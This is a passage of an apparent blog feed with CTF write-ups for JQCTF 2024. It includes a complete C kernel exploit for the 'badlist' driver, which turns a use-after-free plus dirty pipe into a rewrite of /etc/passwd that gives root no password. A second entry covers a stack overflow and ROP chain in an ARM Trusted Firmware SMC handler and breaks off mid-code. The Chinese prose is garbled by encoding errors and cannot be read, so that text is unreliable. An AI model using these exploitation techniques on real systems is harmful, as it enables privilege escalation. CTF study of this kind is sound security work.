    <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡kerneläº†ï¼Œæ‘¸ä¸€é“</p><span id="more"></span><h1 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h1><ul><li><p>æ•°æ®ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_args</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     idx_src;<br>    <span class="hljs-type">uint8_t</span>     idx_dst;<br>    <span class="hljs-type">uint16_t</span>    id;<br>    <span class="hljs-type">char</span>*      content;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_list</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_chunk</span>*<span class="hljs-title">next</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_chunk</span>*<span class="hljs-title">prev</span>;</span><br>    <span class="hljs-type">uint8_t</span>   idx;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_chunk</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_chunk</span>*<span class="hljs-title">next</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_chunk</span>*<span class="hljs-title">prev</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_info</span>*<span class="hljs-title">info</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_info</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span>id;<br>    <span class="hljs-type">uint16_t</span>count;<br>    <span class="hljs-type">char</span>*content[<span class="hljs-number">0x1fc</span>];<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>åŠŸèƒ½ï¼š</p><ul><li>0x1337ï¼šcreate chunk</li><li>0x1338ï¼šdelete chunk</li><li>0x1339ï¼šlink chunk</li><li>0x133aï¼šcreate list</li><li>0x133bï¼šdelete list</li><li>0x133cï¼šshow chunk</li></ul></li><li><p>æ¼æ´ç‚¹ï¼šcountå¯ä»¥å¾ªç¯ï¼Œkfree infoåä¸ä¼šæŠŠinfoæŒ‡é’ˆç½®ç©ºï¼Œå¯ä»¥uaf</p></li></ul><h1 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>badlist_infoçš„å¤§å°æ˜¯0x400ï¼Œç”¨pipe_bufferï¼Œ<em>ä¹Ÿå°±ä¼šè¿™ä¸ªäº†</em></p><ul><li>freeçš„pageä¼šæ”¾è¿›tmp_pageå¾ªç¯ä½¿ç”¨<ul><li>å…ˆwriteä¸€é¡µå†å…¨éƒ¨readï¼Œfreeçš„pageå˜æˆtmp_page</li><li>å†writeä¸‹ä¸€ä¸ªpipe_bufferå°±ä¼šä½¿ç”¨tmp_pageï¼Œåˆ©ç”¨ç¬¬äºŒä¸ªpipe_bufferè·å¾—pageå’ŒopsæŒ‡é’ˆ</li><li>ä¸»è¦æ˜¯ä¸ºäº†è§£å†³badlist_infoå‰å››å­—èŠ‚çš„idå’ŒcountæœªçŸ¥çš„é—®é¢˜</li></ul></li><li>dirty pipe<ul><li>æ”¹&#x2F;etc&#x2F;passwdï¼ŒæŠŠrootè®¾ç½®ä¸ºæ— å¯†ç </li></ul></li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>è‡ªå·±æ“çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEV_PATH                <span class="hljs-string">&quot;/dev/badlist&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREATE_CHUNK_MAGIC      0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELETE_CHUNK_MAGIC      0x1338</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LINK_CHUNK_MAGIC        0x1339</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREATE_LIST_MAGIC       0x133a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELETE_LIST_MAGIC       0x133b</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USE_CHUNK_MAGIC         0x133c</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TARGET_FILE             <span class="hljs-string">&quot;/etc/passwd&quot;</span></span><br><br><br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">char</span> buffer[<span class="hljs-number">0x2000</span>];<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">badlist_args</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     idx_src;<br>    <span class="hljs-type">uint8_t</span>     idx_dst;<br>    <span class="hljs-type">uint16_t</span>    id;<br>    <span class="hljs-type">char</span> *      content; <br>&#125; Badlist_Args;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_chunk</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> idx, <span class="hljs-type">uint16_t</span> id, <span class="hljs-type">char</span> * content)</span> &#123;<br>    Badlist_Args args = &#123;<br>        .idx_src    = idx,<br>        .id         = id &lt;&lt; <span class="hljs-number">8</span>,<br>        .content    = content,<br>    &#125;;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, CREATE_CHUNK_MAGIC, &amp;args);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">delete_chunk</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> idx, <span class="hljs-type">uint16_t</span> id)</span> &#123;<br>    Badlist_Args args = &#123;<br>        .idx_src    = idx,<br>        .id         = id &lt;&lt; <span class="hljs-number">8</span>,<br>    &#125;;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, DELETE_CHUNK_MAGIC, &amp;args);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">link_chunk</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> idx_src, <span class="hljs-type">uint8_t</span> idx_dst, <span class="hljs-type">uint16_t</span> id)</span> &#123;<br>    Badlist_Args args = &#123;<br>        .idx_src    = idx_src,<br>        .idx_dst    = idx_dst,<br>        .id         = id &lt;&lt; <span class="hljs-number">8</span>,<br>    &#125;;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, LINK_CHUNK_MAGIC, &amp;args);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_list</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> idx)</span> &#123;<br>    Badlist_Args args = &#123;<br>        .idx_src    = idx,<br>    &#125;;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, CREATE_LIST_MAGIC, &amp;args);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">delete_list</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> idx)</span> &#123;<br>    Badlist_Args args = &#123;<br>        .idx_src    = idx,<br>    &#125;;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, DELETE_LIST_MAGIC, &amp;args);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">use_chunk</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> idx, <span class="hljs-type">uint16_t</span> id, <span class="hljs-type">char</span> * content)</span> &#123;<br>    Badlist_Args args = &#123;<br>        .idx_src    = idx,<br>        .id         = id &lt;&lt; <span class="hljs-number">8</span>,<br>        .content    = content,<br>    &#125;;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, USE_CHUNK_MAGIC, &amp;args);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    save_status();<br><br>    dev_fd = open(DEV_PATH, O_RDWR);<br>    <span class="hljs-keyword">if</span>(dev_fd &lt; <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;Open Device&quot;</span>);<br>    &#125;<br><br>    create_list(<span class="hljs-number">0</span>);<br>    create_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;testtest&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0xffff</span>; i++) &#123;<br>        use_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, buffer);<br>    &#125;<br>    use_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, buffer);<br><br>    <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br>    pipe(pipe_fd);<br>    write(pipe_fd[<span class="hljs-number">1</span>], buffer, <span class="hljs-number">0x1000</span>);<br>    read(pipe_fd[<span class="hljs-number">0</span>], buffer, <span class="hljs-number">0x1000</span>);<br>    write(pipe_fd[<span class="hljs-number">1</span>], buffer, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-type">int</span> target_fd = open(TARGET_FILE, O_RDONLY);<br>    <span class="hljs-type">loff_t</span> offset = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(target_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;Open Target File&quot;</span>);<br>    &#125;<br>    splice(target_fd, &amp;offset, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">uint16_t</span> pipe_id = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">uint16_t</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-type">uint16_t</span>)<span class="hljs-number">0xffff</span>; i++) &#123;<br>        <span class="hljs-type">int</span> ret = use_chunk(<span class="hljs-number">0</span>, i, &amp;buffer[<span class="hljs-number">4</span>]);<br>        pipe_id = i;<br>        <span class="hljs-keyword">if</span>(!ret) <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    *(<span class="hljs-type">uint16_t</span> *)buffer = pipe_id;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">fake_buffer</span> =</span> (<span class="hljs-keyword">struct</span> pipe_buffer *)&amp;buffer[<span class="hljs-number">0x28</span> * <span class="hljs-number">2</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] pipe_buffer-&gt;page = \033[0m%llx\n&quot;</span>, fake_buffer-&gt;page);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] pipe_buffer-&gt;ops = \033[0m%llx\n&quot;</span>, fake_buffer-&gt;ops);<br><br>    <span class="hljs-type">uint16_t</span> fake_cnt = *(<span class="hljs-type">uint16_t</span> *)&amp;buffer[<span class="hljs-number">0x28</span> + <span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">uint16_t</span> i = fake_cnt - <span class="hljs-number">1</span>; i &lt; (<span class="hljs-type">uint16_t</span>)<span class="hljs-number">0xffff</span>; i++) &#123;<br>        use_chunk(<span class="hljs-number">0</span>, pipe_id, &amp;buffer[<span class="hljs-number">4</span>]);<br>    &#125;<br><br>    delete_chunk(<span class="hljs-number">0</span>, pipe_id);<br>    fake_buffer-&gt;flags = <span class="hljs-number">0x10</span>;<br>    fake_buffer-&gt;len = <span class="hljs-number">0</span>;<br>    create_chunk(<span class="hljs-number">0</span>, pipe_id, &amp;buffer[<span class="hljs-number">4</span>]);<br><br>    <span class="hljs-type">char</span> *root_passwd = <span class="hljs-string">&quot;root::0:0:root:/root:/bin/sh \n&quot;</span>;<br><br>    write(pipe_fd[<span class="hljs-number">1</span>], root_passwd, <span class="hljs-built_in">strlen</span>(root_passwd));<br><br>    close(dev_fd);<br>    close(pipe_fd[<span class="hljs-number">0</span>]);<br>    close(pipe_fd[<span class="hljs-number">1</span>]);<br>    close(target_fd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/08/16/jqctf2024-badlist/getroot.png" class title="getroot"><h1 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h1><p>å®˜æ–¹åšæ³•</p><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><ul><li>ç”¨linkåŠŸèƒ½ï¼ˆå…¶å®æ˜¯insert ( â€¢Ì€ Ï‰ â€¢Ì ) ï¼‰å¤åˆ¶å‡ ä»½info</li><li>double freeååˆ†é…ç»™pipe_bufferå’Œmsg_msg</li><li>åˆ©ç”¨msg_msgé€ dirty pipe</li></ul><p><em>ä¼˜é›…çš„å †å–·~</em></p><img src="/2024/08/16/jqctf2024-badlist/flag1.png" class title="flag1"><img src="/2024/08/16/jqctf2024-badlist/flag2.png" class title="flag2">]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>kernel</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 äº¬éº’CTF babytf wp</title>
    <link href="/2024/08/10/jqctf2024-babytf/"/>
    <url>/2024/08/10/jqctf2024-babytf/</url>
    
    <content type="html"><![CDATA[<p>è™šæ‹Ÿæœºcloneå¯„äº†æ‰€ä»¥ä¸»æœºcloneç„¶åæ‰“åŒ…åˆ°è™šæ‹Ÿæœºé‡Œå¯¼è‡´ç¬¦å·é“¾æ¥å…¨æ²¡äº†ç¼–è¯‘ä¸€ç›´å¯„ï¼Œè¯„ä»·ä¸ºï¼šé¡¶å°–äººå¹²é¡¶å°–äº‹ï¼šï¼‰</p><span id="more"></span><h1 id="äº¤äº’"><a href="#äº¤äº’" class="headerlink" title="äº¤äº’"></a>äº¤äº’</h1><ul><li><p>æ³¨å†Œäº†ä¸€ä¸ªsmcæœåŠ¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">DECLARE_RT_SVC(<br>MY_SVC,<br>OEN_OEM_START,<br>OEN_OEM_END,<br>SMC_TYPE_FAST,<br>my_own_svc_setup,<br>my_smc_handler<br>);<br></code></pre></td></tr></table></figure><p>handlerï¼Œvulnä¸­å­˜åœ¨æ ˆæº¢å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uintptr_t</span> <span class="hljs-title function_">my_smc_handler</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> smc_fid,</span><br><span class="hljs-params">   <span class="hljs-type">u_register_t</span> x1,</span><br><span class="hljs-params">   <span class="hljs-type">u_register_t</span> x2,</span><br><span class="hljs-params">   <span class="hljs-type">u_register_t</span> x3,</span><br><span class="hljs-params">   <span class="hljs-type">u_register_t</span> x4,</span><br><span class="hljs-params">   <span class="hljs-type">void</span> *cookie,</span><br><span class="hljs-params">   <span class="hljs-type">void</span> *handle,</span><br><span class="hljs-params">   <span class="hljs-type">u_register_t</span> flags)</span>&#123;<br><br>    ERROR(<span class="hljs-string">&quot;vuln_handler: SMC Call: 0x%x\n&quot;</span>, smc_fid);<br>    <span class="hljs-keyword">if</span> (smc_fid != <span class="hljs-number">0xc3000000</span>)<br>        SMC_RET1(handle, SMC_UNK);<br>    vuln((<span class="hljs-type">void</span> *)x1, (<span class="hljs-type">size_t</span>)x2);<br>    SMC_RET1(handle, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">(<span class="hljs-type">void</span> *x1, <span class="hljs-type">size_t</span> x2)</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>];<br>    ERROR(<span class="hljs-string">&quot;vuln\n&quot;</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf,(<span class="hljs-type">void</span> *)x1, x2);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯»flagçš„å‡½æ•°ï¼Œä½†è¦æ§åˆ¶x0&#x3D;&#x3D;flagï¼Œéœ€è¦ROP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> flag[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">void</span> <span class="hljs-title function_">getflag</span><span class="hljs-params">(<span class="hljs-type">size_t</span> addr)</span>&#123;<br>    <span class="hljs-keyword">if</span>(addr != (<span class="hljs-type">size_t</span>)flag)&#123;<br>        tf_log(<span class="hljs-string">&quot;\x0aget flag failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">asm</span>(<br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_0\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0]\n&quot;</span><br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_1\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0,#4]\n&quot;</span><br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_2\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0,#8]\n&quot;</span><br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_3\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0,#0xC]\n&quot;</span><br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_4\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0,#0x10]\n&quot;</span><br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_5\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0,#0x14]\n&quot;</span><br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_6\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0,#0x18]\n&quot;</span><br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_7\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0,#0x1C]\n&quot;</span><br>    );<br>    <span class="hljs-keyword">if</span>(addr == (<span class="hljs-type">size_t</span>)flag)&#123;<br>        tf_log(<span class="hljs-string">&quot;\x0aget flag success!\n&quot;</span>);<br>        tf_log(<span class="hljs-string">&quot;\x0a%s\n&quot;</span>,flag);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>ç”±äºsmcæŒ‡ä»¤å¿…é¡»åœ¨å†…æ ¸æ€æ‰§è¡Œï¼Œæœ‰rootæƒé™ï¼Œå¯ä»¥å†™ä¸€ä¸ªé©±åŠ¨æ‰§è¡ŒsmcæŒ‡ä»¤ï¼Œæ ¹æ®è¿™è¡Œä»£ç â†“åˆ¤æ–­fidä¸º0xc3000000</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (smc_fid != <span class="hljs-number">0xc3000000</span>)<br>    SMC_RET1(handle, SMC_UNK);<br></code></pre></td></tr></table></figure><p>æˆ–è€…å¯ä»¥æ ¹æ®è¿™å¼ è¡¨å’Œæ³¨å†ŒæœåŠ¡çš„ä»£ç åˆ¤æ–­</p><img src="/2024/08/10/jqctf2024-babytf/service.webp" class title="service"></li></ul><h1 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h1><p>ä¸ºäº†è®©ç¯å¢ƒå°½å¯èƒ½ä¸€è‡´ï¼Œæ‹‰äº†ä¸ª22.04çš„ubuntuçš„dockerç¼–çš„</p><p>ç¼–å‡ºæ¥é©±åŠ¨è¿˜æ˜¯æŒ‚ä¸ä¸Šï¼Œversion magicå¯¹ä¸ä¸Šï¼Œ<em>å°è¯•è¿‡ç›´æ¥patchï¼Œç„¶åå°±å˜æˆäº†è¿™æ ·</em></p><img src="/2024/08/10/jqctf2024-babytf/vermagic.png" class title="vermagic"><p><em><strong>äººæ— è¯­åˆ°ä¸€å®šç¨‹åº¦çœŸçš„ä¼šç¬‘~~~&#x2F;&#x2F;&#x2F;(^v^)\\\~~~</strong></em></p><p>æœ€åæ”¹äº†Makefileæˆäº†</p><img src="/2024/08/10/jqctf2024-babytf/makefile.png" class title="makefile"><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><ul><li><p>vulnæ˜¯ä»ç‰©ç†åœ°å€è¿›è¡Œmemcpyï¼Œç»™äº†ä¸€ä¸ªbuffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ERROR(<span class="hljs-string">&quot;Your share buffer is at 0x%x, size 0x2000\n&quot;</span>, <span class="hljs-number">0x423DF000</span>);<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨é©±åŠ¨çš„mmapæŠŠç‰©ç†åœ°å€æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´</p></li><li><p>ç”¨è¿™ä¸¤æ¡æŒ‡ä»¤è¿›è¡ŒROPæ§åˆ¶x0ï¼Œå†æ‰§è¡Œgetflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x000000000e0a01d4: mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;<br>0x000000000e0a1e6c: ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;<br></code></pre></td></tr></table></figure></li><li><p>ç›´æ¥æ‰§è¡Œgetflagä¼šé‡å¤æ‰§è¡Œgetflagï¼Œå› ä¸ºROPé“¾æ˜¯ç”¨x30è°ƒç”¨getflagçš„</p><img src="/2024/08/10/jqctf2024-babytf/error.png" class title="error"><p>å¯ä»¥ä»getflagçš„ç¬¬äºŒæ¡æŒ‡ä»¤å¼€å§‹æ‰§è¡Œï¼Œä¼šç›´æ¥å¯„ï¼Œä¸ä¼šæœ‰é‚£ä¹ˆå¤šè¾“å‡º</p><img src="/2024/08/10/jqctf2024-babytf/flag.png" class title="flag"></li><li><p><em>å…¶å®å¯ä»¥æŠŠæ‰€æœ‰æ­¥éª¤æ”¾åœ¨é©±åŠ¨çš„inité‡Œï¼Œä½†è¿™æ ·æ¯æ¬¡æ›´æ”¹éƒ½è¦é‡ç¼–é©±åŠ¨å¾ˆè€—æ—¶</em></p></li></ul><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>æ„Ÿè°¢å‘†ç¥</p><ul><li><p>my_exploit_driver.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 